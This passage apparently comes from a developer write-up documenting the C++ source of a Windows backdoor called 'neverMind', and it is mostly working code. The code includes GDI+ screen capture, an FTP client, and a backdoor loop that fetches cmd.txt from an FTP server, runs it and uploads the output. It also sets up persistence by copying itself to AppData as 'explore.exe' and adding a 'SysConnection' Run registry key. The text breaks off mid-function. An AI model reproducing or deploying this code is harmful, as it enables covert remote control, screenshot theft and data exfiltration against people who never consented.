<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>HBITMAP wrapper<span style="color:#ff79c6">::</span>GdiPlusScreenCapture(HWND hWnd)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    HDC hwindowDC <span style="color:#ff79c6">=</span> GetDC(hWnd);
</span></span><span style="display:flex;"><span>    HDC hwindowCompatibleDC <span style="color:#ff79c6">=</span> CreateCompatibleDC(hwindowDC);
</span></span><span style="display:flex;"><span>    SetStretchBltMode(hwindowCompatibleDC, COLORONCOLOR);
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> scale <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> screenx <span style="color:#ff79c6">=</span> GetSystemMetrics(SM_XVIRTUALSCREEN);
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> screeny <span style="color:#ff79c6">=</span> GetSystemMetrics(SM_YVIRTUALSCREEN);
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> width <span style="color:#ff79c6">=</span> GetSystemMetrics(SM_CXVIRTUALSCREEN);
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> height <span style="color:#ff79c6">=</span> GetSystemMetrics(SM_CYVIRTUALSCREEN);
</span></span><span style="display:flex;"><span>    HBITMAP hbwindow <span style="color:#ff79c6">=</span> CreateCompatibleBitmap(hwindowDC, width, height);
</span></span><span style="display:flex;"><span>    BITMAPINFOHEADER bi <span style="color:#ff79c6">=</span> wrapper<span style="color:#ff79c6">::</span>createBitmapHeader(width, height);
</span></span><span style="display:flex;"><span>    SelectObject(hwindowCompatibleDC, hbwindow);
</span></span><span style="display:flex;"><span>    StretchBlt(hwindowCompatibleDC, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, width, height, hwindowDC, screenx, screeny, width, height, SRCCOPY);
</span></span><span style="display:flex;"><span>    GetDIBits(hwindowCompatibleDC, hbwindow, <span style="color:#bd93f9">0</span>, height, lpbitmap, (BITMAPINFO<span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>bi, DIB_RGB_COLORS);
</span></span><span style="display:flex;"><span>    DeleteDC(hwindowCompatibleDC);
</span></span><span style="display:flex;"><span>    ReleaseDC(hWnd, hwindowDC);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> hbwindow;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>saveToMemory(HBITMAP* hbitmap, std::vector&lt;BYTE&gt;&amp; data, std::string dataFormat)</code>: saves a bitmap specified by <code>hbitmap</code> to memory in the format specified by <code>dataFormat</code> and stores the data in data.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">bool</span> wrapper<span style="color:#ff79c6">::</span>saveToMemory(HBITMAP<span style="color:#ff79c6">*</span> hbitmap, std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span>BYTE<span style="color:#ff79c6">&gt;&amp;</span> data, std<span style="color:#ff79c6">::</span>string dataFormat)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    Gdiplus<span style="color:#ff79c6">::</span>Bitmap bmp(<span style="color:#ff79c6">*</span>hbitmap, <span style="color:#ff79c6">nullptr</span>);
</span></span><span style="display:flex;"><span>    IStream<span style="color:#ff79c6">*</span> istream <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">nullptr</span>;
</span></span><span style="display:flex;"><span>    CreateStreamOnHGlobal(<span style="color:#8be9fd;font-style:italic">NULL</span>, TRUE, <span style="color:#ff79c6">&amp;</span>istream);
</span></span><span style="display:flex;"><span>    CLSID clsid;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (dataFormat.compare(<span style="color:#f1fa8c">&#34;bmp&#34;</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) { CLSIDFromString(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;{557cf400-1a04-11d3-9a73-0000f81ef32e}&#34;</span>, <span style="color:#ff79c6">&amp;</span>clsid); }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (dataFormat.compare(<span style="color:#f1fa8c">&#34;jpg&#34;</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) { CLSIDFromString(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;{557cf401-1a04-11d3-9a73-0000f81ef32e}&#34;</span>, <span style="color:#ff79c6">&amp;</span>clsid); }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (dataFormat.compare(<span style="color:#f1fa8c">&#34;gif&#34;</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) { CLSIDFromString(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;{557cf402-1a04-11d3-9a73-0000f81ef32e}&#34;</span>, <span style="color:#ff79c6">&amp;</span>clsid); }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (dataFormat.compare(<span style="color:#f1fa8c">&#34;tif&#34;</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) { CLSIDFromString(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;{557cf405-1a04-11d3-9a73-0000f81ef32e}&#34;</span>, <span style="color:#ff79c6">&amp;</span>clsid); }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (dataFormat.compare(<span style="color:#f1fa8c">&#34;png&#34;</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) { CLSIDFromString(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;{557cf406-1a04-11d3-9a73-0000f81ef32e}&#34;</span>, <span style="color:#ff79c6">&amp;</span>clsid); }
</span></span><span style="display:flex;"><span>    Gdiplus<span style="color:#ff79c6">::</span>Status status <span style="color:#ff79c6">=</span> bmp.Save(istream, <span style="color:#ff79c6">&amp;</span>clsid, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (status <span style="color:#ff79c6">!=</span> Gdiplus<span style="color:#ff79c6">::</span>Status<span style="color:#ff79c6">::</span>Ok)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">false</span>;
</span></span><span style="display:flex;"><span>    HGLOBAL hg <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
</span></span><span style="display:flex;"><span>    GetHGlobalFromStream(istream, <span style="color:#ff79c6">&amp;</span>hg);
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> bufsize <span style="color:#ff79c6">=</span> GlobalSize(hg);
</span></span><span style="display:flex;"><span>    data.resize(bufsize);
</span></span><span style="display:flex;"><span>    LPVOID pimage <span style="color:#ff79c6">=</span> GlobalLock(hg);
</span></span><span style="display:flex;"><span>    memcpy(<span style="color:#ff79c6">&amp;</span>data[<span style="color:#bd93f9">0</span>], pimage, bufsize);
</span></span><span style="display:flex;"><span>    GlobalUnlock(hg);
</span></span><span style="display:flex;"><span>    istream<span style="color:#ff79c6">-&gt;</span>Release();
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">true</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>screenshot(const std::string&amp; path)</code>: takes a screenshot, saves it as a JPEG file in the directory specified by path, and returns the full path of the screenshot file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#ff79c6">::</span>string wrapper<span style="color:#ff79c6">::</span>screenshot(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> path)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    std<span style="color:#ff79c6">::</span>string full_path <span style="color:#ff79c6">=</span> (std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path(path) <span style="color:#ff79c6">/</span> std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path((wrapper<span style="color:#ff79c6">::</span>get_date() <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;.jpg&#34;</span>))).u8string();
</span></span><span style="display:flex;"><span>    GdiplusStartupInput gdiplusStartupInput;
</span></span><span style="display:flex;"><span>    ULONG_PTR gdiplusToken;
</span></span><span style="display:flex;"><span>    GdiplusStartup(<span style="color:#ff79c6">&amp;</span>gdiplusToken, <span style="color:#ff79c6">&amp;</span>gdiplusStartupInput, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>    HWND hWnd <span style="color:#ff79c6">=</span> GetDesktopWindow();
</span></span><span style="display:flex;"><span>    HBITMAP hBmp <span style="color:#ff79c6">=</span> wrapper<span style="color:#ff79c6">::</span>GdiPlusScreenCapture(hWnd);
</span></span><span style="display:flex;"><span>    std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span>BYTE<span style="color:#ff79c6">&gt;</span> data;
</span></span><span style="display:flex;"><span>    std<span style="color:#ff79c6">::</span>string dataFormat <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;jpg&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (wrapper<span style="color:#ff79c6">::</span>saveToMemory(<span style="color:#ff79c6">&amp;</span>hBmp, data, dataFormat))
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>ofstream fout(full_path, std<span style="color:#ff79c6">::</span>ios<span style="color:#ff79c6">::</span>binary);
</span></span><span style="display:flex;"><span>        fout.write((<span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span>)data.data(), data.size());
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>    GdiplusShutdown(gdiplusToken);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> full_path;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>this function initializes GDI+, captures the screen, saves the captured image to memory in JPEG format, writes the image data to a file, and then shuts down GDI+. the file is saved in the directory specified by path and its name is the current date and time. the full path of the file is returned. if the image cannot be saved to memory, an empty string is returned.</p>
<h3 id="ftpc">ftpC</h3>
<p>the <code>ftpC</code> class defined in <code>ftp.h</code> and implemented in <code>ftp.cpp</code> provides a set of functions for FTP operations. the <code>ftpC</code> class uses the WinINet API to perform FTP operations. The <code>m_host</code>, <code>m_username</code>, and <code>m_password</code> member variables store the host, username, and password for the FTP connection. The <code>ftpIO</code> and <code>ftpS</code> member variables are handles to the internet connection and the FTP session, respectively.</p>
<h4 id="constructor--destructor">constructor + destructor</h4>
<p><code>ftpC(const std::string&amp; host, const std::string&amp; username, const std::string&amp; password)</code>: the constructor initializes the FTP connection with the provided host, username, and password.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>ftpC<span style="color:#ff79c6">::</span>ftpC(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> host, <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> username, <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> password)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">:</span> m_host(host), m_username(username), m_password(password), ftpIO(<span style="color:#8be9fd;font-style:italic">NULL</span>), ftpS(<span style="color:#8be9fd;font-style:italic">NULL</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>~ftpC()</code>: the destructor cleans up the FTP connection by closing the internet + FTP handles.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>ftpC<span style="color:#ff79c6">::~</span>ftpC()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (ftpS)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            InternetCloseHandle(ftpS);
</span></span><span style="display:flex;"><span>            ftpS <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (ftpIO)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            InternetCloseHandle(ftpIO);
</span></span><span style="display:flex;"><span>            ftpIO <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><h4 id="ftp-operations">FTP operations</h4>
<p><code>connect()</code>: this function opens an internet connection and connects to the FTP server using the provided host, username, and password. if it fails to open the connection or connect to the FTP server, it throws a runtime error.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> ftpC<span style="color:#ff79c6">::</span>connect()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        ftpIO <span style="color:#ff79c6">=</span> InternetOpenA(<span style="color:#f1fa8c">&#34;SystemConnection&#34;</span>, INTERNET_OPEN_TYPE_DIRECT, m_host.c_str(), <span style="color:#bd93f9">0</span>, INTERNET_FLAG_CACHE_IF_NET_FAIL);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (ftpIO <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            DWORD error <span style="color:#ff79c6">=</span> GetLastError();
</span></span><span style="display:flex;"><span>            LPVOID lpMsgBuf;
</span></span><span style="display:flex;"><span>            FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER <span style="color:#ff79c6">|</span> FORMAT_MESSAGE_FROM_SYSTEM <span style="color:#ff79c6">|</span> FORMAT_MESSAGE_IGNORE_INSERTS, <span style="color:#8be9fd;font-style:italic">NULL</span>, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR)<span style="color:#ff79c6">&amp;</span>lpMsgBuf, <span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>            std<span style="color:#ff79c6">::</span>string errorMessage <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">static_cast</span><span style="color:#ff79c6">&lt;</span><span style="color:#8be9fd">char</span><span style="color:#ff79c6">*&gt;</span>(lpMsgBuf);
</span></span><span style="display:flex;"><span>            LocalFree(lpMsgBuf);
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">throw</span> std<span style="color:#ff79c6">::</span>runtime_error(<span style="color:#f1fa8c">&#34;[!] failed to open connection: &#34;</span> <span style="color:#ff79c6">+</span> errorMessage);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        ftpS <span style="color:#ff79c6">=</span> InternetConnectA(ftpIO, m_host.c_str(), INTERNET_DEFAULT_FTP_PORT, m_username.c_str(), m_password.c_str(), INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (ftpS <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            DWORD error <span style="color:#ff79c6">=</span> GetLastError();
</span></span><span style="display:flex;"><span>            LPVOID lpMsgBuf;
</span></span><span style="display:flex;"><span>            FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER <span style="color:#ff79c6">|</span> FORMAT_MESSAGE_FROM_SYSTEM <span style="color:#ff79c6">|</span> FORMAT_MESSAGE_IGNORE_INSERTS,
</span></span><span style="display:flex;"><span>                          <span style="color:#8be9fd;font-style:italic">NULL</span>, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR)<span style="color:#ff79c6">&amp;</span>lpMsgBuf, <span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>            std<span style="color:#ff79c6">::</span>string errorMessage <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">static_cast</span><span style="color:#ff79c6">&lt;</span><span style="color:#8be9fd">char</span><span style="color:#ff79c6">*&gt;</span>(lpMsgBuf);
</span></span><span style="display:flex;"><span>            LocalFree(lpMsgBuf);
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">throw</span> std<span style="color:#ff79c6">::</span>runtime_error(<span style="color:#f1fa8c">&#34;[!] failed to connect to ftp server: &#34;</span> <span style="color:#ff79c6">+</span> errorMessage);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>upload_file(const std::string&amp; local_path, const std::string&amp; server_name)</code>: this function uploads a file from the local path to the FTP server with the specified server name. it returns true if the upload is successful.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">bool</span> ftpC<span style="color:#ff79c6">::</span>upload_file(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> local_path, <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> server_name)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        BOOL result <span style="color:#ff79c6">=</span> FtpPutFileA(ftpS, local_path.c_str(), server_name.c_str(), FTP_TRANSFER_TYPE_BINARY, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>retr_file(const std::string&amp; local_path, const std::string&amp; server_name)</code>: this function downloads a file from the FTP server to the local path.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">bool</span> ftpC<span style="color:#ff79c6">::</span>retr_file(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> local_path, <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> server_name)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        BOOL result <span style="color:#ff79c6">=</span> FtpGetFileA(ftpS, server_name.c_str(), local_path.c_str(), <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, FTP_TRANSFER_TYPE_BINARY, INTERNET_FLAG_HYPERLINK);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>mkdir(const std::string&amp; folder_name)</code>: this function creates a new directory on the FTP server with the specified folder name.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">bool</span> ftpC<span style="color:#ff79c6">::</span>mkdir(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> folder_name)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        BOOL result <span style="color:#ff79c6">=</span> FtpCreateDirectoryA(ftpS, folder_name.c_str());
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>cd(const std::string&amp; server_path)</code>: this function changes the current directory on the FTP server to the directory specified by <code>server_path</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">bool</span> ftpC<span style="color:#ff79c6">::</span>cd(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> server_path)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        BOOL result <span style="color:#ff79c6">=</span> FtpSetCurrentDirectoryA(ftpS, server_path.c_str());
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><h3 id="nevermind">neverMind</h3>
<p>the <code>neverMind</code> class defined in <code>neverMind.h</code> and implemented in <code>neverMind.cpp</code> provides a set of functions for backdoor operations.</p>
<h4 id="constructor--destructor-1">constructor + destructor</h4>
<p><code>neverMind(const std::string &amp;host, const std::string &amp;username, const std::string &amp;password)</code>: the constructor initializes the backdoor with the provided FTP host, username, and password. it also sets up paths for the backdoor.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>neverMind<span style="color:#ff79c6">::</span>neverMind(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string <span style="color:#ff79c6">&amp;</span>host, <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string <span style="color:#ff79c6">&amp;</span>username, <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string <span style="color:#ff79c6">&amp;</span>password)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">:</span> ftp_host(host), ftp_username(username), ftp_password(password), ftp_connection(ftpC(ftp_host, ftp_username, ftp_password)), win_username(wrapper<span style="color:#ff79c6">::</span>get_username()), store_path(<span style="color:#f1fa8c">&#34;C:</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">Users</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">+</span> win_username <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">AppData</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">Local</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">SystemConnect&#34;</span>), data_path((std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path(store_path) <span style="color:#ff79c6">/</span> <span style="color:#f1fa8c">&#34;data&#34;</span>).u8string()), app_path((std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path(store_path) <span style="color:#ff79c6">/</span> <span style="color:#f1fa8c">&#34;app&#34;</span>).u8string()), output_path((std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path(data_path) <span style="color:#ff79c6">/</span> <span style="color:#f1fa8c">&#34;output.txt&#34;</span>).u8string())
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>~neverMind()</code>: the destructor is empty as there are no specific resources that need to be cleaned up. this can be modified by you!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>neverMind<span style="color:#ff79c6">::~</span>neverMind()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><h4 id="backdoor-operations">backdoor operations</h4>
<p><code>start()</code>: this function opens the backdoor, sets up necessary directories, connects to the FTP server, downloads + executes commands, and manages the registry.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> neverMind<span style="color:#ff79c6">::</span>start()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>exists(store_path))
</span></span><span style="display:flex;"><span>            setup();
</span></span><span style="display:flex;"><span>        ftp_connection.connect();
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>ftp_connection.cd(win_username)) {
</span></span><span style="display:flex;"><span>            ftp_connection.mkdir(win_username);
</span></span><span style="display:flex;"><span>            ftp_connection.cd(win_username);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>string file_path <span style="color:#ff79c6">=</span> (std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path(app_path) <span style="color:#ff79c6">/</span> <span style="color:#f1fa8c">&#34;cmd.txt&#34;</span>).u8string();
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (ftp_connection.retr_file(file_path, <span style="color:#f1fa8c">&#34;cmd.txt&#34;</span>)) {
</span></span><span style="display:flex;"><span>            Sleep(<span style="color:#bd93f9">1500</span>);
</span></span><span style="display:flex;"><span>            compile(file_path);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        ftp_connection.upload_file(output_path, <span style="color:#f1fa8c">&#34;output.txt&#34;</span>);
</span></span><span style="display:flex;"><span>        Sleep(<span style="color:#bd93f9">2000</span>);
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>setup()</code>: this function sets up necessary directories and adds the backdoor to the registry for persistence.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> neverMind<span style="color:#ff79c6">::</span>setup()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>create_directory(store_path);
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>create_directory(data_path);
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>create_directory(app_path);
</span></span><span style="display:flex;"><span>        add_to_reg();
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>add_to_reg()</code>: this function adds the backdoor to the registry for persistence. it copies the current executable to a new location and adds it to the startup registry key. the command <code>reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysConnection /t REG_SZ /d \&quot;&quot; + dest + &quot;\&quot;</code> adds a new entry <code>SysConnection</code> to the <code>Run</code> key in the Windows Registry. the entry contains the path of the neverMind executable. as a result, the backdoor will be executed every time the user logs on to Windows.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> neverMind<span style="color:#ff79c6">::</span>add_to_reg()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        WCHAR path[MAX_PATH];
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> len <span style="color:#ff79c6">=</span> GetModuleFileNameW(<span style="color:#8be9fd;font-style:italic">NULL</span>, path, MAX_PATH);
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>string new_path;
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>string dest <span style="color:#ff79c6">=</span> (std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path(store_path) <span style="color:#ff79c6">/</span> <span style="color:#f1fa8c">&#34;explore.exe&#34;</span>).u8string();
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> len; <span style="color:#ff79c6">++</span>i)
</span></span><span style="display:flex;"><span>            new_path <span style="color:#ff79c6">+=</span> path[i];
